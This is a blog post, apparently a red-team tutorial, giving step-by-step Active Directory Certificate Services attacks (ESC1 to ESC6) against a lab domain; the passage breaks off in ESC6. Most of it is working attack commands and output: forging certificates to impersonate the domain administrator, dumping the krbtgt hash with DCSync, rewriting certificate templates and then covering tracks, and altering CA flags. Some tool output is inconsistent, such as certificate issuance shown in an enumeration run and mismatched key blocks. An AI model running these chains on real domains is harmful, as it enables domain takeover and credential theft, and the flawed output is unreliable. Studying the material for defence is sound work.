{"pageProps":{"postData":{"slug":"adcs-complete-attack-reference","contentHtml":"\n<p><img src=\"/images/adcs-attacks.jpeg\" alt=\"ADCS attack vectors and certificate template abuse\"></p>\n<h2>Introduction</h2>\n<p>Let's talk about Active Directory Certificate Services. If you've been doing red team work for any length of time, you've probably heard about ADCS attacks. What started as a convenient way to manage digital certificates has turned into one of the most powerful attack vectors in modern Windows environments.</p>\n<p>Here's the problem - most organizations deploy ADCS with dangerous default configurations, and many admins don't understand the security implications of certificate templates. This creates a goldmine for attackers seeking privilege escalation and persistence that's incredibly hard to detect.</p>\n<p>I've been exploiting ADCS misconfigurations for years, and what I've found is that the same features that make certificate services useful also make them dangerous. That flexible template system that admins love? It's perfect for privilege escalation. The auto-enrollment that makes management easy? It's a playground for persistence attacks. The single endpoint that handles everything? It bypasses traditional security controls.</p>\n<p>In this article, I'll walk you through every major ADCS attack technique discovered to date - from the foundational ESC1-8 attacks to the latest ESC13-16 techniques. You'll learn not just how these attacks work, but how to implement them in real environments with practical code examples. Everything here is based on actual penetration tests I've conducted, with working examples you can adapt to your own assessments.</p>\n<p><strong>Lab Environment</strong>: All examples in this article are demonstrated using the <a href=\"https://github.com/Orange-Cyberdefense/GOAD\">GOAD (Game of Active Directory)</a> lab environment, which provides a realistic multi-domain Active Directory setup perfect for testing these techniques. The domains we'll be working with include <code>essos.local</code>, <code>sevenkingdoms.local</code>, and <code>north.sevenkingdoms.local</code>.</p>\n<p>Whether you're a red teamer looking to expand your toolkit or a defender trying to understand these threats, this article will give you the deep technical knowledge you need.</p>\n<h2>ADCS Fundamentals</h2>\n<p>Before we start breaking things, let's understand what makes ADCS different from other Windows services you're used to attacking. ADCS implements a Public Key Infrastructure (PKI) that typically follows this hierarchy:</p>\n<pre class=\"language-none\"><code class=\"language-none\">Root CA (Offline)\n    └── Subordinate CA (Online)\n        └── Certificate Templates\n            └── Issued Certificates\n</code></pre>\n<p>Let's see what this looks like in our GOAD environment:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Discover ADCS servers in the environment\nnxc ldap 192.168.56.10-23 -u '' -p '' -M adcs\n\nSMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 17763 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)\nLDAPS       192.168.56.12   636    MEEREEN          [+] essos.local\\guest: \nADCS        192.168.56.12   -      MEEREEN          Found PKI Enrollment Server: meereen.essos.local\nADCS        192.168.56.12   -      MEEREEN          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\n\nSMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)\nLDAPS       192.168.56.23   636    BRAAVOS          [+] essos.local\\guest: \nADCS        192.168.56.23   -      BRAAVOS          Found PKI Enrollment Server: braavos.essos.local\nADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\n</code></pre>\n<p>The key components we'll exploit:</p>\n<ul>\n<li><strong>Certificate Authority (CA)</strong>: Issues and manages certificates</li>\n<li><strong>Certificate Templates</strong>: Define what certificates can be requested and by whom</li>\n<li><strong>Certificate Store</strong>: Where certificates are stored on machines</li>\n<li><strong>Auto-enrollment</strong>: Automatic certificate enrollment for domain objects</li>\n</ul>\n<h3>Certificate Template Basics</h3>\n<p>Certificate templates are the core of ADCS attacks. They define:</p>\n<ul>\n<li>Who can request certificates (enrollment permissions)</li>\n<li>What the certificate can be used for (Enhanced Key Usage)</li>\n<li>Whether the subject name can be specified by the requester</li>\n<li>Authentication requirements for enrollment</li>\n</ul>\n<p>Here's what makes templates dangerous - they often allow way more access than admins realize. Let's look at what we find in GOAD, and enumerate certificate templates with Certify: <code>Certify.exe find /vulnerable</code> command. This shows us several vulnerable templates in the GOAD environment. Now let's dive into exploiting them.</p>\n<h2>ESC1: Misconfigured Certificate Templates</h2>\n<p>ESC1 is the most straightforward ADCS attack, and honestly, it's my favorite because it's so reliable. It exploits certificate templates that allow attackers to specify arbitrary Subject Alternative Names (SANs).</p>\n<h3>Technical Details</h3>\n<p>The vulnerability happens when a certificate template has:</p>\n<ol>\n<li><strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong> flag enabled</li>\n<li><strong>Client Authentication</strong> or <strong>Any Purpose</strong> EKU</li>\n<li><strong>Domain Users</strong> enrollment permissions</li>\n<li>No <strong>manager approval</strong> required</li>\n</ol>\n<p>When all these conditions align, you can request a certificate for any user in the domain. It's that simple.</p>\n<h3>Exploitation Process</h3>\n<p>First, let's enumerate vulnerable templates in our GOAD lab. Using Certify to find ESC1 vulnerabilities:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject\n\n[*] Action: Find certificate templates\n[*] Using current user's unrolled group SID list for cross-references\n[*] Current user context       : ESSOS\\missandei\n[*] Using the search base 'CN=Configuration,DC=essos,DC=local'\n\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC1\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : ENROLLEE_SUPPLIES_SUBJECT (0x1)\n    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Client Authentication\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n        Enrollment Rights           : ESSOS\\Domain Computers                Access: Allow\n      Object Control Permissions  : ESSOS\\missandei                      Access: Allow\n\n[*] CA Response             : The certificate has been issued.\n\n  KeyType                  : rc4_hmac\n  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==\n\n  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)\n  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)\n</code></pre>\n<p>Perfect! This output confirms <code>ESSOS\\Domain Users</code> (which <code>missandei</code> is a member of) have enrollment rights on the \"ESC1\" template, and the template allows an enrollee to supply the subject. <em>Note: The output also indicates <code>missandei</code> has \"Object Control Permissions\" over this specific template, which would additionally make it vulnerable to ESC4 by her. For ESC1, we primarily focus on the enrollment rights.</em></p>\n<p>Perfect! Now let's request a certificate for the domain administrator. Request certificate impersonating Domain Admin:</p>\n<p><strong>⚠️ Important:</strong> For accuracy and to avoid certificate mismatch issues, we should always aim to provide the <code>/sid</code> parameter which should be the SID of the user we are targeting (administrator in this case).</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC1 /altname:essos\\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] No subject name specified, using current context as subject.\n\n[*] Template                : ESC1\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n[*] AltName                 : essos\\administrator\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 7\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW\n...certificate data...\n-----END CERTIFICATE-----\n\n[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre>\n<p>Now let's convert to PFX format for use with Rubeus. There are two methods:</p>\n<p><strong>Method 1: Using OpenSSL (cross-platform)</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">openssl pkcs12 -in cert.pem -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out administrator.pfx\n</code></pre>\n<p><strong>Method 2: Using certutil (Windows native)</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Save the private key and certificate to separate files\n# cert.key (from -----BEGIN RSA PRIVATE KEY----- to -----END RSA PRIVATE KEY-----)\n# cert.pem (from -----BEGIN CERTIFICATE----- to -----END CERTIFICATE-----)\n\n# Then merge them with certutil\ncertutil -MergePFX .\\cert.pem .\\administrator.pfx\n</code></pre>\n<p>Use Rubeus to either request NTLM hash directly or get a Kerberos TGT:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Get NTLM Hash directly\nRubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials\n\n# Or get TGT (traditional method)\nRubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.3.2\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[*] Building AS-REQ (w/ PKINIT preauth) for: 'essos.local\\administrator'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n      doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6MIIEtqADAgEFoQ8bDUVTU09TLkxPQ0FM\n      ...base64 encoded ticket...\n\n[*] Action: Describe Ticket\n\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 10:30:15 AM\n  EndTime                  : 1/3/2025 8:30:15 PM\n  RenewTill                : 1/10/2025 10:30:15 AM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  : rc4_hmac\n  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==\n\n  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)\n  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)\n</code></pre>\n<p>Perfect! Now we can use the TGT to perform DCSync:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...\n\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n\n# Now perform DCSync as administrator\nmimikatz.exe \"lsadump::dcsync /domain:essos.local /user:krbtgt\"\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # lsadump::dcsync /domain:essos.local /user:krbtgt\n[DC] 'essos.local' will be the domain\n[DC] 'meereen.essos.local' will be the DC server\n[DC] 'krbtgt' will be the DSRM user\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 1/15/2023 2:14:32 PM\nObject Security ID   : S-1-5-21-1394808576-3393508183-1134699666-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: a577fcf16cfef780a2ceb343ec39a0d9\n    ntlm- 0: a577fcf16cfef780a2ceb343ec39a0d9\n    lm  - 0: 367ac3b3d1f4d80b8f52a7b6e8c1d2e9\n</code></pre>\n<p>Excellent! We've successfully escalated from a domain user (<code>missandei</code>) to domain admin using ESC1.</p>\n<p><strong>Key Improvements for ESC1 Attacks:</strong></p>\n<ul>\n<li>Use <code>/sid</code> parameter for accuracy and to avoid certificate mismatch issues</li>\n<li><code>/getcredentials</code> flag extracts NTLM hash directly without needing TGT</li>\n<li><code>certutil -MergePFX</code> provides Windows-native certificate conversion</li>\n<li>More specific enumeration with <code>/enabled /enrolleeSuppliesSubject</code> flags</li>\n</ul>\n<h3>Advanced ESC1 Techniques</h3>\n<p>For evasion and reliability, consider these advanced approaches using the GOAD environment:</p>\n<pre class=\"language-csharp\"><code class=\"language-csharp\">// Custom C# implementation for certificate requests\nusing System.Security.Cryptography.X509Certificates;\nusing System.Text;\nusing CERTENROLLLib;\n\npublic class CertificateRequestor\n{\n    public string RequestCertificate(string caConfig, string template, string altName)\n    {\n        // Create certificate request\n        var request = new CX509CertificateRequestPkcs10();\n        var privateKey = new CX509PrivateKey();\n        var csp = new CCspInformation();\n        \n        // Configure private key\n        privateKey.ProviderName = \"Microsoft Enhanced RSA and AES Cryptographic Provider\";\n        privateKey.KeySpec = X509KeySpec.XCN_AT_KEYEXCHANGE;\n        privateKey.Length = 2048;\n        privateKey.Create();\n        \n        // Build certificate request for GOAD environment\n        request.InitializeFromPrivateKey(\n            X509CertificateEnrollmentContext.ContextUser,\n            privateKey,\n            template);\n            \n        // Add SAN extension for administrator@essos.local\n        var sanExtension = new CX509ExtensionAlternativeNames();\n        var altNames = new CAlternativeNames();\n        var altNameObj = new CAlternativeName();\n        \n        altNameObj.InitializeFromString(\n            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,\n            altName);\n        altNames.Add(altNameObj);\n        \n        sanExtension.InitializeEncode(altNames);\n        request.X509Extensions.Add(sanExtension);\n        \n        // Submit request\n        var enroll = new CX509Enrollment();\n        enroll.InitializeFromRequest(request);\n        enroll.CertificateFriendlyName = \"ESC1 Certificate\";\n        \n        return enroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);\n    }\n}\n</code></pre>\n<h2>ESC2: Misconfigured Certificate Templates with Any Purpose EKU</h2>\n<p>ESC2 targets templates with the \"Any Purpose\" Extended Key Usage, which essentially means the certificate can be used for anything.</p>\n<h3>Vulnerability Conditions</h3>\n<ul>\n<li>Certificate template has <strong>Any Purpose EKU</strong> (OID: 2.5.29.37.0)</li>\n<li><strong>Domain Users</strong> have enrollment rights</li>\n<li>No <strong>manager approval</strong> required</li>\n</ul>\n<p><strong>Important Note:</strong> ESC2 alone does not allow direct impersonation of other users like ESC1. An Any Purpose certificate becomes truly dangerous only when the CA or template also allows SAN/SID injection (ESC 6/9/10). On a fully-patched domain controller with strong certificate mapping enforcement (following KB5014754 patches from May 2022, with full enforcement phases extending through early 2025), an Any-Purpose certificate on its own will not bypass strong certificate mapping.</p>\n<h3>Exploitation</h3>\n<p>Let's check for ESC2 templates in GOAD:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC2\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : 0x0\n    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Any Purpose\n    msPKI-Application-Policies    : Any Purpose\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n</code></pre>\n<p>In vanilla GOAD, ESC2 template is cloned from the built-in User template and keeps only Any-Purpose EKU (no ENROLLEE_SUPPLIES_SUBJECT flag). If your lab shows the flag, that's ESC1 + AnyPurpose combined.</p>\n<p>Now request certificate with Any Purpose EKU (as yourself)</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC2\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : ESC2\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 8\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3kT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW\n...certificate data...\n-----END CERTIFICATE-----\n</code></pre>\n<p>Use certificate for client authentication (as the requesting user)</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Rubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n</code></pre>\n<p>The Any Purpose EKU can still be dangerous as it bypasses many certificate validation checks and can be used for code signing, server authentication, and other purposes beyond the intended use case.</p>\n<h2>ESC3: Enrollment Agent Templates</h2>\n<p>ESC3 is a really cool technique that exploits certificate templates granting Certificate Request Agent (Enrollment Agent) permissions. Basically, you can request certificates on behalf of other users once you get an agent certificate.</p>\n<h3>Attack Flow</h3>\n<p>The attack is pretty straightforward:</p>\n<ol>\n<li>Request an Enrollment Agent certificate</li>\n<li>Use that agent certificate to request certificates for other users</li>\n<li>Authenticate as those users</li>\n</ol>\n<h3>Implementation</h3>\n<p>Let's see this in action with our GOAD environment:</p>\n<p>Step 1: Request Enrollment Agent certificate\nThe built-in template is called \"EnrollmentAgent\" - clone it to ESC3-CRA for your lab if needed</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:EnrollmentAgent\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : EnrollmentAgent\n[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 9\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAzGQ5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEz\n...enrollment agent certificate...\n-----END CERTIFICATE-----\n</code></pre>\n<p>Step 2: Use agent certificate to request certificate for Domain Admin</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /onbehalfof:ESSOS\\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz\n\n[*] Action: Request a Certificates on behalf of another user\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : User\n[*] On behalf of            : ESSOS\\administrator\n[*] Agent Certificate       : agent.pfx\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 10\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ\n...administrator certificate...\n-----END CERTIFICATE-----\n</code></pre>\n<p>Step 3: Authenticate as administrator</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Rubeus.exe asktgt /user:administrator /certificate:admin.pfx\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  StartTime                : 1/3/2025 11:15:23 AM\n  EndTime                  : 1/3/2025 9:15:23 PM\n  RenewTill                : 1/10/2025 11:15:23 AM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n</code></pre>\n<p>Perfect! We've escalated from <code>khal.drogo</code> to <code>administrator</code> using the ESC3 technique.</p>\n<h2>ESC4: Vulnerable Certificate Template Access Control</h2>\n<p>ESC4 is one of my favorite techniques because it's sneaky. Instead of exploiting existing vulnerable templates, you modify a secure template to make it vulnerable, exploit it, then clean up your tracks.</p>\n<h3>Exploitation Strategy</h3>\n<p>Here's how the attack works:</p>\n<ol>\n<li>Find templates where you have dangerous permissions (WriteProperty or WriteOwner)</li>\n<li>Modify the template to make it vulnerable to ESC1</li>\n<li>Exploit the newly vulnerable template</li>\n<li>Clean up your modifications to cover your tracks</li>\n</ol>\n<h3>Practical Implementation</h3>\n<p>Let's see what we can modify in GOAD. Find templates with vulnerable ACLs:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC4\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : 0x0\n    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Client Authentication\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n      Object Control Permissions\n        Owner                       : ESSOS\\Administrator\n        WriteProperty Principals    : ESSOS\\khal.drogo                     Access: Allow\n        WriteDacl Principals        : ESSOS\\Administrator\n\n# First, backup original template settings for cleanup\nGet-ADObject \"CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -Properties * | Select-Object * | Export-Clixml ESC4-backup.xml\n\n# Modify template to enable ENROLLEE_SUPPLIES_SUBJECT\n$template = Get-ADObject \"CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\nSet-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=1}\n\n[*] Template ESC4 modified to enable ENROLLEE_SUPPLIES_SUBJECT\n\n# Wait for AD replication\nStart-Sleep -Seconds 30\n\n# Request certificate with arbitrary SAN\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC4 /altname:upn:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : ESC4\n[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 11\n\n# Authenticate as administrator\nRubeus.exe asktgt /user:administrator /certificate:admin.pfx\n\n[+] TGT request successful!\n\n# Restore original template (cleanup)\n$template = Get-ADObject \"CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\nSet-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=0}\n\n[*] Template ESC4 restored to original configuration\n</code></pre>\n<h3>PowerShell Template Modification</h3>\n<p>Here's a more robust script for template modification in GOAD:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">function Modify-CertificateTemplate {\n    param(\n        [string]$TemplateName,\n        [switch]$EnableSubjectAltName,\n        [switch]$Restore,\n        [string]$Domain = \"essos.local\"\n    )\n    \n    $configPath = \"CN=Configuration,\" + (Get-ADDomain -Identity $Domain).DistinguishedName\n    $templatePath = \"CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configPath\"\n    \n    try {\n        $template = Get-ADObject $templatePath -Properties \"msPKI-Certificate-Name-Flag\"\n        \n        if ($Restore) {\n            # Restore to secure setting\n            Set-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=0}\n            Write-Host \"[+] Template $TemplateName restored to secure configuration\"\n        } else {\n            # Enable ENROLLEE_SUPPLIES_SUBJECT\n            Set-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=1}\n            Write-Host \"[+] Template $TemplateName modified to enable subject specification\"\n        }\n        \n        # Wait for AD replication\n        Write-Host \"[*] Waiting for AD replication...\"\n        Start-Sleep -Seconds 30\n        \n    } catch {\n        Write-Error \"Failed to modify template: $($_.Exception.Message)\"\n    }\n}\n\n# Usage in GOAD environment\nModify-CertificateTemplate -TemplateName \"ESC4\" -EnableSubjectAltName -Domain \"essos.local\"\n# ... perform attack ...\nModify-CertificateTemplate -TemplateName \"ESC4\" -Restore -Domain \"essos.local\"\n</code></pre>\n<h2>ESC5: Vulnerable PKI Object Access Control</h2>\n<p>ESC5 exploits weak permissions on PKI objects themselves, including the CA server and certificate templates container.</p>\n<h3>Attack Vectors</h3>\n<ol>\n<li><strong>CA Server Object</strong>: WriteProperty permission allows configuration changes</li>\n<li><strong>Certificate Templates Container</strong>: GenericWrite allows template creation</li>\n<li><strong>Individual CA Objects</strong>: Various dangerous permissions</li>\n</ol>\n<p>Let's examine what we have in GOAD. Check CA object permissions in essos.local domain:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Get-ADObject \"CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -Properties nTSecurityDescriptor\n\nDistinguishedName : CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\nName              : ESSOS-CA\nObjectClass       : pKIEnrollmentService\nObjectGUID        : 4f8bd644-2c29-418c-93f1-fe926f91f6b4\n\n# In GOAD, khal.drogo has interesting permissions on the CA\n</code></pre>\n<h3>CA Configuration Modification</h3>\n<p>If you have WriteProperty, modify CA settings. Enable SAN in issued certificates:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">certutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n\nCertUtil: -setreg command completed successfully.\nThe command completed successfully.\n</code></pre>\n<p>Restart certificate services to apply changes</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">net stop certsvc &#x26;&#x26; net start certsvc\n\nThe Certificate Services service is stopping.\nThe Certificate Services service was stopped successfully.\nThe Certificate Services service is starting.\nThe Certificate Services service was started successfully.\n\n# Wait for services to fully restart\nStart-Sleep -Seconds 10\n</code></pre>\n<p>Now we can request certificate with SAN from any template:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /altname:upn:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : User\n[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 12\n</code></pre>\n<h3>Certificate Template Creation</h3>\n<p>If you have GenericWrite on the Certificate Templates container in GOAD, create a new vulnerable template:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$templateDN = \"CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\n\n# Template with dangerous settings for GOAD environment\nNew-ADObject -Name \"EvilTemplate\" -Type \"pKICertificateTemplate\" -Path \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -OtherAttributes @{\n    'flags' = 131680\n    'msPKI-Certificate-Name-Flag' = 1\n    'msPKI-Enrollment-Flag' = 41\n    'msPKI-Minimal-Key-Size' = 2048\n    'msPKI-Private-Key-Flag' = 16842752\n    'msPKI-Template-Schema-Version' = 2\n    'pKIDefaultKeySpec' = 1\n    'pKIExpirationPeriod' = ([byte[]](0x00,0x40,0x1E,0xA4,0xE8,0x65,0xFA,0xFF))\n    'pKIExtendedKeyUsage' = @('1.3.6.1.5.5.7.3.2')\n    'pKIKeyUsage' = ([byte[]](0x80,0x00))\n    'pKIOverlapPeriod' = ([byte[]](0x00,0x80,0xA6,0x0A,0xFF,0xDE,0xFF,0xFF))\n    'revision' = 100\n}\n\nObjectGUID                : 8f3e2a1b-9c4d-4e5f-a6b7-c8d9e0f1a2b3\nDistinguishedName         : CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\nName                      : EvilTemplate\nObjectClass               : pKICertificateTemplate\n\n# Template created successfully and ready for exploitation\n</code></pre>\n<h2>ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2</h2>\n<p>ESC6 exploits the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA, which allows SAN specification in any certificate request.</p>\n<p><em>For detailed information on this vulnerability and remediation steps, see Microsoft Learn's <a href=\"https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting\">\"Edit vulnerable Certificate Authority setting (ESC6)\"</a> article.</em></p>\n<h3>Vulnerability Check</h3>\n<p>Let's check the GOAD CA configuration. Check if flag is enabled on ESSOS-CA:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">certutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\ESSOS-CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags REG_DWORD = 0x144120 (1327392)\n\nEDITF_ATTRIBUTESUBJECTALTNAME2 